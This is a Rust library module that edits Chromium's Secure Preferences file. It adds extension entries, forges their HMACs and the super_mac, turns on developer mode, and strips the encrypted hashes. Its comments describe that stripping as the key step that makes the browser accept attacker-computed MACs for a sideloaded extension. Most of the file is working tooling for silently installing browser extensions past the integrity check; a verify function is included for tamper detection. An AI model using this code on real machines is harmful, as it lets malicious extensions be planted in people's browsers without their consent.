//! Secure Preferences JSON manipulation.
//!
//! Higher-level operations built on top of [`crate::mac`]. These functions
//! take a mutable reference to a `serde_json::Value` (the parsed Secure
//! Preferences file) and mutate it in place. **They do no I/O** — the caller
//! is responsible for reading the file, calling these operations, and writing
//! the result back atomically.
//!
//! Typical add-extension flow:
//!
//! ```no_run
//! use secpref_kit::{prefs, manifest, resolve_ext_id};
//! use std::path::Path;
//!
//! # let seed = [0u8; 64];
//! # let sid = "S-1-5-21-...";
//! # let content = std::fs::read_to_string("Secure Preferences").unwrap();
//! let mut prefs_json: serde_json::Value = serde_json::from_str(&content).unwrap();
//!
//! let m = manifest::parse(Path::new("/path/to/ext")).unwrap();
//! let ext_path = "/path/to/ext";
//! let ext_id = resolve_ext_id(m.key.as_deref(), ext_path).into_id();
//! let settings = manifest::build_default_settings(&m, ext_path);
//!
//! prefs::add_extension(&mut prefs_json, &ext_id, settings, &seed, sid).unwrap();
//! prefs::enable_developer_mode(&mut prefs_json, &seed, sid);
//! prefs::strip_encrypted_hashes(&mut prefs_json);
//! prefs::recompute_super_mac(&mut prefs_json, &seed, sid);
//!
//! let output = serde_json::to_string(&prefs_json).unwrap();
//! std::fs::write("Secure Preferences", output).unwrap();
//! ```

use serde_json::{Map, Value};

use crate::{mac, SecPrefError};

/// Result of [`verify_extension`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[allow(clippy::struct_excessive_bools)] // independent integrity checks, not object state
pub struct VerifyResult {
    /// Whether the stored extension MAC matches a fresh computation.
    pub ext_mac_valid: bool,
    /// Whether the stored `extensions.ui.developer_mode` MAC matches.
    pub dev_mac_valid: bool,
    /// Whether the signed-in `account_values` developer-mode MAC matches.
    pub account_dev_mac_valid: bool,
    /// Whether the stored `protection.super_mac` matches.
    pub super_mac_valid: bool,
}

impl VerifyResult {
    /// `true` iff all four checks passed.
    #[must_use]
    pub fn all_valid(&self) -> bool {
        self.ext_mac_valid
            && self.dev_mac_valid
            && self.account_dev_mac_valid
            && self.super_mac_valid
    }
}

/// Description of an installed extension, per [`list_extensions`].
#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub struct ExtInfo {
    /// The 32-character extension ID.
    pub id: String,
    /// The manifest `name` field, or `"(unknown)"` if absent.
    pub name: String,
    /// The `path` field stored in `extensions.settings.<id>.path`.
    pub path: String,
    /// The manifest `version` field, or empty if absent.
    pub version: String,
    /// `true` if `state == 1` (enabled).
    pub enabled: bool,
}

/// Add an extension to `extensions.settings.<ext_id>` and MAC it.
///
/// Also MACs the `settings` blob under `protection.macs.extensions.settings.<ext_id>`.
///
/// Does not touch `super_mac` — call [`recompute_super_mac`] afterwards.
/// Does not touch `_encrypted_hash` entries — call [`strip_encrypted_hashes`]
/// (usually once, at the end of a batch of edits).
///
/// # Errors
///
/// Returns [`SecPrefError::UnexpectedShape`] if `prefs_json` is not an object.
pub fn add_extension(
    prefs_json: &mut Value,
    ext_id: &str,
    mut settings: Value,
    seed: &[u8],
    device_id: &str,
) -> Result<String, SecPrefError> {
    require_object(prefs_json, "$")?;

    // Chromium's HMAC input is the settings blob AFTER stripping empties, so
    // strip before MAC-ing and before writing.
    mac::strip_empties(&mut settings);

    ensure_object(prefs_json, &["extensions", "settings"])
        .insert(ext_id.to_string(), settings.clone());

    let path = format!("extensions.settings.{ext_id}");
    let ext_mac = mac::compute_mac(seed, device_id, &path, &settings);

    ensure_object(
        prefs_json,
        &["protection", "macs", "extensions", "settings"],
    )
    .insert(ext_id.to_string(), Value::String(ext_mac.clone()));

    Ok(ext_mac)
}

/// Remove an extension and its per-value MAC.
///
/// Does not touch `super_mac` — call [`recompute_super_mac`] after.
///
/// # Errors
///
/// [`SecPrefError::ExtensionNotFound`] if the ID is not present under
/// `extensions.settings`.
pub fn remove_extension(prefs_json: &mut Value, ext_id: &str) -> Result<(), SecPrefError> {
    let settings = prefs_json
        .get_mut("extensions")
        .and_then(|e| e.get_mut("settings"))
        .and_then(Value::as_object_mut)
        .ok_or_else(|| SecPrefError::UnexpectedShape {
            path: "extensions.settings".into(),
            reason: "missing or non-object".into(),
        })?;

    if settings.swap_remove(ext_id).is_none() {
        return Err(SecPrefError::ExtensionNotFound(ext_id.into()));
    }

    if let Some(macs) = prefs_json
        .get_mut("protection")
        .and_then(|p| p.get_mut("macs"))
        .and_then(|m| m.get_mut("extensions"))
        .and_then(|e| e.get_mut("settings"))
        .and_then(Value::as_object_mut)
    {
        macs.swap_remove(ext_id);
    }

    Ok(())
}

/// Set `extensions.ui.developer_mode = true` (and the signed-in mirror at
/// `account_values.extensions.ui.developer_mode`) and MAC both values.
///
/// Required for unpacked / sideloaded extensions to load without a
/// "developer mode" warning.
pub fn enable_developer_mode(prefs_json: &mut Value, seed: &[u8], device_id: &str) {
    ensure_object(prefs_json, &["extensions", "ui"])
        .insert("developer_mode".into(), Value::Bool(true));
    ensure_object(prefs_json, &["account_values", "extensions", "ui"])
        .insert("developer_mode".into(), Value::Bool(true));

    let dev_mac = mac::compute_mac(
        seed,
        device_id,
        "extensions.ui.developer_mode",
        &Value::Bool(true),
    );
    ensure_object(prefs_json, &["protection", "macs", "extensions", "ui"])
        .insert("developer_mode".into(), Value::String(dev_mac));

    let account_dev_mac = mac::compute_mac(
        seed,
        device_id,
        "account_values.extensions.ui.developer_mode",
        &Value::Bool(true),
    );
    ensure_object(
        prefs_json,
        &["protection", "macs", "account_values", "extensions", "ui"],
    )
    .insert("developer_mode".into(), Value::String(account_dev_mac));
}

/// Recursively remove every key that contains `"_encrypted_hash"`.
///
/// Triggers Chromium's self-healing fallback: on next startup, Chromium
/// regenerates the encrypted hashes from the (now attacker-computed) MACs
/// rather than rejecting them. This is the crucial primitive of the whole
/// technique — without it Chromium would notice the mismatched
/// `settings_encrypted_hash` sub-tree and reset the extension.
pub fn strip_encrypted_hashes(value: &mut Value) {
    match value {
        Value::Object(map) => {
            let keys_to_remove: Vec<String> = map
                .keys()
                .filter(|k| k.contains("_encrypted_hash"))
                .cloned()
                .collect();
            for k in &keys_to_remove {
                map.swap_remove(k);
            }
            for v in map.values_mut() {
                strip_encrypted_hashes(v);
            }
        }
        Value::Array(arr) => {
            for item in arr.iter_mut() {
                strip_encrypted_hashes(item);
            }
        }
        _ => {}
    }
}

/// Recompute `protection.super_mac` over the current `protection.macs`
/// sub-tree and write it into `protection.super_mac`.
///
/// Returns the fresh MAC (uppercase hex). Call this last, after every other
/// mutation that touches `protection.macs`.
pub fn recompute_super_mac(prefs_json: &mut Value, seed: &[u8], device_id: &str) -> String {
    let macs = prefs_json
        .get("protection")
        .and_then(|p| p.get("macs"))
        .cloned()
        .unwrap_or_else(|| Value::Object(Map::new()));

    let super_mac = mac::compute_super_mac(seed, device_id, &macs);
    ensure_object(prefs_json, &["protection"])
        .insert("super_mac".into(), Value::String(super_mac.clone()));
    super_mac
}

/// Verify that a stored extension's MACs (per-value + `developer_mode` + super)
/// match a fresh computation.
///
/// A defensive tool can call this to detect tampered `Secure Preferences`
/// files.
///
/// # Errors
///
/// [`SecPrefError::ExtensionNotFound`] if `ext_id` is not present.
pub fn verify_extension(
    prefs_json: &Value,
    ext_id: &str,
    seed: &[u8],
    device_id: &str,
) -> Result<VerifyResult, SecPrefError> {
    let ext_settings = prefs_json
        .get("extensions")
        .and_then(|e| e.get("settings"))
        .and_then(|s| s.get(ext_id))
        .ok_or_else(|| SecPrefError::ExtensionNotFound(ext_id.into()))?;

    let stored_ext_mac = prefs_json
        .get("protection")
        .and_then(|p| p.get("macs"))
        .and_then(|m| m.get("extensions"))
        .and_then(|e| e.get("settings"))
        .and_then(|s| s.get(ext_id))
        .and_then(Value::as_str)
        .unwrap_or("");

    let path = format!("extensions.settings.{ext_id}");
    let computed_ext_mac = mac::compute_mac(seed, device_id, &path, ext_settings);
    let ext_mac_valid = computed_ext_mac.eq_ignore_ascii_case(stored_ext_mac);

    let dev_value = prefs_json
        .get("extensions")
        .and_then(|e| e.get("ui"))
        .and_then(|u| u.get("developer_mode"))
        .unwrap_or(&Value::Null);
    let stored_dev_mac = prefs_json
        .get("protection")
        .and_then(|p| p.get("macs"))
        .and_then(|m| m.get("extensions"))
        .and_then(|e| e.get("ui"))
        .and_then(|u| u.get("developer_mode"))
        .and_then(Value::as_str)
        .unwrap_or("");

    let computed_dev_mac =
        mac::compute_mac(seed, device_id, "extensions.ui.developer_mode", dev_value);
    let dev_mac_valid = computed_dev_mac.eq_ignore_ascii_case(stored_dev_mac);

    let account_dev_value = prefs_json
        .get("account_values")
        .and_then(|a| a.get("extensions"))
        .and_then(|e| e.get("ui"))
        .and_then(|u| u.get("developer_mode"))
        .unwrap_or(&Value::Null);
    let stored_account_dev_mac = prefs_json
        .get("protection")
        .and_then(|p| p.get("macs"))
        .and_then(|m| m.get("account_values"))
        .and_then(|a| a.get("extensions"))
        .and_then(|e| e.get("ui"))
        .and_then(|u| u.get("developer_mode"))
        .and_then(Value::as_str)
        .unwrap_or("");
    let computed_account_dev_mac = mac::compute_mac(
        seed,
        device_id,
        "account_values.extensions.ui.developer_mode",
        account_dev_value,
    );
    let account_dev_mac_valid =
        computed_account_dev_mac.eq_ignore_ascii_case(stored_account_dev_mac);

    let stored_super = prefs_json
        .get("protection")
        .and_then(|p| p.get("super_mac"))
        .and_then(Value::as_str)
        .unwrap_or("");

    let macs = prefs_json
        .get("protection")
        .and_then(|p| p.get("macs"))
        .cloned()
        .unwrap_or_else(|| Value::Object(Map::new()));
    let computed_super = mac::compute_super_mac(seed, device_id, &macs);
    let super_mac_valid = computed_super.eq_ignore_ascii_case(stored_super);

    Ok(VerifyResult {
        ext_mac_valid,
        dev_mac_valid,
        account_dev_mac_valid,
        super_mac_valid,
    })
}

/// List extensions present under `extensions.settings`.
///
/// Never fails on a well-formed Secure Preferences file; returns an empty
/// list if `extensions.settings` is missing.
#[must_use]
pub fn list_extensions(prefs_json: &Value) -> Vec<ExtInfo> {
    let Some(Value::Object(settings)) =
        prefs_json.get("extensions").and_then(|e| e.get("settings"))
    else {
        return Vec::new();
    };

    settings
        .iter()
        .map(|(id, ext)| {
            let name = ext
                .get("manifest")
                .and_then(|m| m.get("name"))
                .and_then(Value::as_str)
                .unwrap_or("(unknown)")
                .to_string();

            let path = ext
                .get("path")
                .and_then(Value::as_str)
                .unwrap_or("")
                .to_string();

            let version = ext
                .get("manifest")
                .and_then(|m| m.get("version"))
                .and_then(Value::as_str)
                .unwrap_or("")
                .to_string();

            let state = ext.get("state").and_then(Value::as_i64).unwrap_or(0);

            ExtInfo {
                id: id.clone(),
                name,
                path,
                version,
                enabled: state == 1,
            }
        })
        .collect()
}

// ---------------- internal helpers ----------------

fn require_object(value: &Value, path: &str) -> Result<(), SecPrefError> {
    if value.is_object() {
        Ok(())
    } else {
        Err(SecPrefError::UnexpectedShape {
            path: path.into(),
            reason: "expected object at root".into(),
        })
    }
}

/// Navigate into nested objects, creating intermediate objects as needed.
/// Returns a mutable reference to the innermost object's map.
fn ensure_object<'a>(root: &'a mut Value, keys: &[&str]) -> &'a mut Map<String, Value> {
    let mut current = root;
    for &key in keys {
        if !current.get(key).is_some_and(Value::is_object) {
            current[key] = Value::Object(Map::new());
        }
        current = current.get_mut(key).expect("just created");
    }
    current.as_object_mut().expect("guaranteed object")
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn add_extension_writes_settings_and_mac() {
        let mut prefs = json!({});
        let ext_id = "abcdefghijklmnopqrstuvwxyzabcdef";
        let settings = json!({"state": 1});
        let seed = [0u8; 64];

        let mac = add_extension(&mut prefs, ext_id, settings.clone(), &seed, "sid").unwrap();
        assert_eq!(mac.len(), 64);

        assert!(prefs
            .get("extensions")
            .and_then(|e| e.get("settings"))
            .and_then(|s| s.get(ext_id))
            .is_some());
        assert!(prefs
            .get("protection")
            .and_then(|p| p.get("macs"))
            .and_then(|m| m.get("extensions"))
            .and_then(|e| e.get("settings"))
            .and_then(|s| s.get(ext_id))
            .is_some());
    }

    #[test]
    fn add_then_remove_leaves_no_traces() {
        let mut prefs = json!({});
        let ext_id = "abcdefghijklmnopqrstuvwxyzabcdef";
        add_extension(&mut prefs, ext_id, json!({"state": 1}), &[0u8; 64], "sid").unwrap();
        remove_extension(&mut prefs, ext_id).unwrap();

        assert!(prefs
            .get("extensions")
            .and_then(|e| e.get("settings"))
            .and_then(|s| s.get(ext_id))
            .is_none());
        assert!(prefs
            .get("protection")
            .and_then(|p| p.get("macs"))
            .and_then(|m| m.get("extensions"))
            .and_then(|e| e.get("settings"))
            .and_then(|s| s.get(ext_id))
            .is_none());
    }

    #[test]
    fn strip_encrypted_hashes_is_recursive() {
        let mut v = json!({
            "protection": {
                "macs": {
                    "settings_encrypted_hash": "AAAA",
                    "extensions": {
                        "settings_encrypted_hash": "BBBB",
                        "settings": {"testid_encrypted_hash": "CCCC"}
                    }
                }
            },
            "keep_me": "yes"
        });
        strip_encrypted_hashes(&mut v);
        assert!(v.get("keep_me").is_some());
        assert!(v
            .get("protection")
            .and_then(|p| p.get("macs"))
            .and_then(|m| m.get("settings_encrypted_hash"))
            .is_none());
        assert!(v
            .get("protection")
            .and_then(|p| p.get("macs"))
            .and_then(|m| m.get("extensions"))
            .and_then(|e| e.get("settings_encrypted_hash"))
            .is_none());
    }

    #[test]
    fn recompute_super_mac_produces_stable_value() {
        let mut prefs = json!({});
        add_extension(
            &mut prefs,
            "abcdefghijklmnopqrstuvwxyzabcdef",
            json!({"state": 1}),
            &[7u8; 64],
            "sid-42",
        )
        .unwrap();
        let super_mac_a = recompute_super_mac(&mut prefs, &[7u8; 64], "sid-42");
        let super_mac_b = recompute_super_mac(&mut prefs, &[7u8; 64], "sid-42");
        assert_eq!(super_mac_a, super_mac_b);
        assert_eq!(super_mac_a.len(), 64);
    }

    #[test]
    fn verify_extension_passes_after_full_install_flow() {
        let mut prefs = json!({});
        let ext_id = "abcdefghijklmnopqrstuvwxyzabcdef";
        let seed = [3u8; 64];
        let sid = "S-1-5-21-1";

        add_extension(
            &mut prefs,
            ext_id,
            json!({"state": 1, "location": 4}),
            &seed,
            sid,
        )
        .unwrap();
        enable_developer_mode(&mut prefs, &seed, sid);
        strip_encrypted_hashes(&mut prefs);
        recompute_super_mac(&mut prefs, &seed, sid);

        let verdict = verify_extension(&prefs, ext_id, &seed, sid).unwrap();
        assert!(verdict.all_valid(), "verify_extension: {verdict:?}");
    }

    #[test]
    fn verify_extension_checks_stored_developer_mode_values_and_both_macs() {
        let mut prefs = json!({});
        let ext_id = "abcdefghijklmnopqrstuvwxyzabcdef";
        let seed = [3u8; 64];
        let device_id = "S-1-5-21-1";

        add_extension(&mut prefs, ext_id, json!({"state": 1}), &seed, device_id).unwrap();
        enable_developer_mode(&mut prefs, &seed, device_id);
        recompute_super_mac(&mut prefs, &seed, device_id);

        prefs["extensions"]["ui"]["developer_mode"] = Value::Bool(false);
        let verdict = verify_extension(&prefs, ext_id, &seed, device_id).unwrap();
        assert!(!verdict.dev_mac_valid);

        prefs["extensions"]["ui"]["developer_mode"] = Value::Bool(true);
        prefs["account_values"]["extensions"]["ui"]["developer_mode"] = Value::Bool(false);
        let verdict = verify_extension(&prefs, ext_id, &seed, device_id).unwrap();
        assert!(!verdict.account_dev_mac_valid);
    }

    #[test]
    fn list_extensions_reports_populated_fields() {
        let mut prefs = json!({});
        add_extension(
            &mut prefs,
            "abcdefghijklmnopqrstuvwxyzabcdef",
            json!({
                "state": 1,
                "path": "/opt/ext",
                "manifest": {"name": "hello", "version": "1.2.3"}
            }),
            &[0u8; 64],
            "sid",
        )
        .unwrap();

        let listed = list_extensions(&prefs);
        assert_eq!(listed.len(), 1);
        let info = &listed[0];
        assert_eq!(info.name, "hello");
        assert_eq!(info.path, "/opt/ext");
        assert_eq!(info.version, "1.2.3");
        assert!(info.enabled);
    }
}
